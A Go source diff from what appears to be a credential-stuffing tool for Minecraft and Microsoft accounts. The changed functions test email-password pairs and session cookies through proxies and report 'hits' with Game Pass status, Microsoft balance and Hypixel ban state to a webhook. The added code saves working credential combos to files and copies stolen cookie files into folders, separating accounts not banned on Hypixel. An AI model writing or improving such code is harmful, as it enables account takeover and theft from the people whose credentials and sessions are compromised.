@@ -202,6 +202,15 @@ func checkAccount(email, password, proxyURL string, cfg *Config) {
 	}
 
 	atomic.AddInt64(&mcHits, 1)
+
+	if currentRunDir != "" {
+		ref := fmt.Sprintf("%s:%s | %s | %s | GP: %s | Ban: %s\n", email, password, username, uuid, gamepassResult, banInfo)
+		safeWrite(filepath.Join(currentRunDir, "minecraft", "all_mc_hits", "combos.txt"), ref)
+		if strings.Contains(banInfo, "unbanned") {
+			safeWrite(filepath.Join(currentRunDir, "minecraft", "hypixel_hits", "combos.txt"), ref)
+		}
+	}
+
 	fmt.Printf("\n  [HIT] %s | %s | GP: %s\n", username, uuid, gamepassResult)
 }
 
@@ -396,6 +405,14 @@ func checkCookies(cookieFile, proxyURL string, cfg *Config) {
 			username, uuid,
 			gamepassResult, msBalance, rewardPoints, hypixelInfo)
 		sendWebhook(wh, embed)
+	}
+
+	if currentRunDir != "" {
+		baseName := filepath.Base(cookieFile)
+		copyFile(cookieFile, filepath.Join(currentRunDir, "minecraft", "all_mc_hits", baseName))
+		if strings.Contains(banInfo, "unbanned") {
+			copyFile(cookieFile, filepath.Join(currentRunDir, "minecraft", "hypixel_hits", baseName))
+		}
 	}
 
 	fmt.Printf("\n  [COOKIE HIT] %s | %s | GP: %s\n", username, uuid, gamepassResult)
